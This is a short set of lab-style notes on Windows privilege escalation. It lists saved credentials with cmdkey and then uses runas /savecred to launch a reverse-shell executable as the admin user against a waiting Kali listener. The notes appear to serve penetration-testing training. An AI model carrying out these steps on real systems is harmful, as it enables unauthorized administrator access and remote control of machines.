List any saved credentials:

	cmdkey /list

Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:

	runas /savecred /user:admin C:\PrivEsc\reverse.exe